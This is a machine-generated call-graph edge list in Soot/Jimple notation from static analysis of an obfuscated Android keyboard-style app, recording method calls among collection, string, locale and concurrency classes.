SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: boolean isAssignableFrom(java.lang.Class)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <iej: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iej: void <clinit>()>
STATIC edge: $r1 = staticinvoke <ljd: ljd g()>() in <lli: void <init>()> ==> <ljd: ljd g()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(20) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lvt: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c2) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.String getName()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <lkh: java.lang.Object[] toArray()> ==> <lkh: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r7.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: void <init>(java.util.List)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(3) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke $r1.<ljf: void <init>()>() in <lmb: java.util.Collection b()> ==> <ljf: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r5, "", $r6, "") in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
SPECIAL edge: specialinvoke $r6.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <nzh: boolean f(ivv)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "metadata key") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <lje: void a()> ==> <java.util.ConcurrentModificationException: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.List: java.lang.Object get(int)>($i1) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r3) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>($r3, $r2) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lje: java.lang.Object next()>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: int o(int,int,int,int)> ==> <ljf: java.lang.Object p()>
CLINIT edge: staticinvoke <lwe: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwe: void <clinit>()>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljd: int z(int,int,int,int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r1, $i0, $i1, $r2) in <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 97, 122, $i0) in <iwt: java.lang.String e(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r2) in <iye: void I(boolean,java.lang.Object)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqo: lsa l()> ==> <lkq: lsb B()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <ltf: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: $i4 = specialinvoke r0.<ljf: int n()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int n()>
STATIC edge: $r7 = staticinvoke <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>($r6) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lso: void <init>()> ==> <lsq: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <ljf: java.util.Iterator iterator()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(1) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>(1, "skipFrames must be >= 0") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map m()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map m()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(14) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <lkx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkx: void <clinit>()>
SPECIAL edge: specialinvoke $r8.<ivw: void <init>()>() in <ivw: void <clinit>()> ==> <ivw: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("BitmojiImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r1, $r2) in <lmb: void g(java.lang.Object,java.lang.Object)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r13.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[],int,int)>
STATIC edge: staticinvoke <lri: void u(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lri: void u(java.lang.Object[])>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r4.<hnp: void <init>()>() in <hnt: void <clinit>()> ==> <hnp: void <init>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $l0 = virtualinvoke r0.<j$.sun.misc.b: long k(java.lang.reflect.Field)>($r4) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <j$.sun.misc.b: long k(java.lang.reflect.Field)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Resetting default value is disallowed [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>($r2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c3) in <ivw: boolean t(char[],int,int)> ==> <ivw: boolean O(char)>
SPECIAL edge: specialinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void <init>(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>(long)>
SPECIAL edge: specialinvoke $r7.<java.lang.String: void <init>(char[])>($r3) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<llo: lsa F()>() in <lmc: lsa l()> ==> <llo: lsa F()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <ljd: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(46) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r1.<llg: void <init>(llo)>(r0) in <llo: lsa F()> ==> <llg: void <init>(llo)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int c()>() in <ljf: java.util.Set f()> ==> <ljf: int c()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <oru: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r1.<lqn: void <init>(lkx,java.lang.Object[],int,int)>(r0, $r2, 0, $i0) in <lqq: lma f()> ==> <lqn: void <init>(lkx,java.lang.Object[],int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqn: lsa l()> ==> <lma: lkq k()>
SPECIAL edge: specialinvoke $r2.<lqs: void <init>(lkq,java.util.Comparator)>($r3, $r0) in <lmo: lqs G(java.util.Comparator)> ==> <lqs: void <init>(lkq,java.util.Comparator)>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(1) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r8.<java.util.Iterator: java.lang.Object next()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.d: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <ql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ql: void <clinit>()>
SPECIAL edge: specialinvoke $r25.<mag: void <init>(java.lang.String,int,int)>("TENOR_TRENDING_SEARCH_TERM_METADATA", 25, 25) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(10) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r3 = staticinvoke <lkq: lkq g(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lkq: lkq g(java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 65, 90, 32) in <iwt: java.lang.String c(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
STATIC edge: $i0 = staticinvoke <lri: int b(java.util.Set)>(r0) in <lma: int hashCode()> ==> <lri: int b(java.util.Set)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lrg: lsa l()>() in <lrg: java.util.Iterator iterator()> ==> <lrg: lsa l()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(20) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getValue()>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r3, $r1) in <lmo: int a(java.lang.Object,java.lang.Object)> ==> <lqc: int compare(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lqs: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: int size()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.Object: boolean equals(java.lang.Object)>($r4) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <java.util.Locale: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.Locale: void <clinit>()>
SPECIAL edge: specialinvoke $r21.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<java.lang.String: int length()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r0.<lso: void <init>()>() in <lsq: void <clinit>()> ==> <lso: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(15) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <lvm: void h(boolean,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("ji", "yi") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
CLINIT edge: staticinvoke <lqr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqr: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: int a()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <java.lang.System: long nanoTime()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long nanoTime()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkg: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r12 = virtualinvoke $r6.<lkt: lkx l()>() in <lmb: lme f()> ==> <lkt: lkx l()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lsg: void <init>()> ==> <lsv: void <init>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r1.<lvs: void <init>(java.lang.String,int)>("STRING", 1) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int length()>() in <ivw: java.lang.String p()> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: int b()> ==> <ljf: boolean m()>
STATIC edge: $r0 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r15.<lvr: void <init>(lvr,lvr)>($r16, $r17) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvr: void <init>(lvr,lvr)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void l(int)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
STATIC edge: $i4 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c3) in <nzh: boolean f(ivv)> ==> <ivw: boolean A(char)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(hff,java.lang.Class,ldp)>($r18, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(hff,java.lang.Class,ldp)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
STATIC edge: $r6 = staticinvoke <lqq: lqq a(int,java.lang.Object[])>(4, $r9) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lqq: lqq a(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(10) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int b(java.lang.Object[],int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: specialinvoke $r6.<ltc: void <init>(java.lang.String,int,int)>("NONE", 4, 0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int c()> ==> <java.lang.UnsupportedOperationException: void <init>()>
SPECIAL edge: $z0 = specialinvoke r0.<lsn: boolean ac()>() in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: boolean ac()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Language tag type is set to ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(boolean[],boolean[])>($r18, $r19) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(boolean[],boolean[])>
